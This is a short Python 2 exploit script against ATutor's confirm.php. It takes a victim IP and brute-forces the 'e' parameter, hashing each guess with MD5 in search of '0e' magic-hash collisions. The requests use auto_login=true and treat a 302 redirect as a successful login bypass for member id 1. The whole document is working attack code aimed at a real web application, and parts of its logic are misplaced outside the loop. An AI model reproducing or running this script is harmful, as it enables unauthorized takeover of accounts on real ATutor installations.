#!/usr/local/bin/python

import hashlib,string,itertools,re,requests,sys

count =0 
chars=string.lowercase + string.digits
#chars=string.digits

if len(sys.argv) < 2:
	print "Usage: %s <victim ip>" % sys.argv[0]
	sys.exit(-1)

id="1"
creationdate="2016-03-22 10:02:26"
ip=sys.argv[1]

#url = "http://%s/ATutor/confirm.php?auto_login=true&member_id=1&id=1&m=1&e=aaaaadp3n&code=0"
#print url
proxies = {
'http': 'http://127.0.0.1:8080',
}


for words in itertools.imap(''.join, itertools.product(chars,repeat=9)):
	hash=hashlib.md5("%s" % words + creationdate + id ).hexdigest()[:10]
	url = "http://%s/ATutor/confirm.php?auto_login=true&member_id=1&id=1&m=1&e=%s&code=0" % (ip ,words)
#	url = "http://%s/ATutor/confirm.php?auto_login=true&member_id=1&id=1&m=1&e=aaaaadp3n&code=0" % (ip)
	print url
        r=requests.post(url,allow_redirects=False,proxies=proxies)
        if (r.status_code==302):
		print "Value used for e is %s" % words
		print("%s" % words + creationdate +id)
		print hash
		break
	elif (r.status_code==200):
		print "Failed"

print "(+)Found 0e\d$ pattern %d" %count
count=count+1
